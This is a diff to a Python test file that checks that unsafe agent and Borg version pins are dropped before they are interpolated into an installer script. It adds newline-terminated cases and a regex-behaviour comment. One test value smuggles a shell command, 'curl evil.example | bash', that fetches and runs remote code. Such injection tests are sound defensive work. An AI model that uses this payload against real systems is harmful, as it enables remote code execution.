@@ -91,7 +91,16 @@ def test_a_borg_version_outside_1_and_2_is_dropped(test_db, pinned_agent, stored
 
 @pytest.mark.parametrize(
     "stored",
-    ['0.1.3" ; curl evil.example | bash ; #', "0.1.3 --agent-source git", "a" * 65],
+    [
+        '0.1.3" ; curl evil.example | bash ; #',
+        "0.1.3 --agent-source git",
+        "a" * 65,
+        # `$` in a `re.match` also matches just before a trailing newline, so a
+        # newline-terminated pin would otherwise pass the whitelist and be
+        # interpolated into the script's assignment.
+        "0.1.3\n",
+        "0.1.3\n--agent-source git",
+    ],
 )
 def test_an_unsafe_agent_version_pin_is_dropped(
     test_db, pinned_agent, stored, monkeypatch
@@ -142,3 +151,13 @@ def test_the_unpinned_script_differs_from_a_pinned_one(
 
     assert 'PINNED_DESIRED_BORG_VERSION=""' in plain
     assert 'PINNED_DESIRED_BORG_VERSION="2"' in pinned
+
+
+def test_a_borg_version_with_a_trailing_newline_is_dropped(test_db, pinned_agent):
+    """The Borg check is an exact-membership test rather than a regex, so it
+    was never newline-permissive. Pinned so it stays that way."""
+    pinned_agent("agt_borg_newline", borg_version="2\n")
+
+    pins = installer_pins_for_agent(test_db, "agt_borg_newline")
+
+    assert pins.desired_borg_version is None
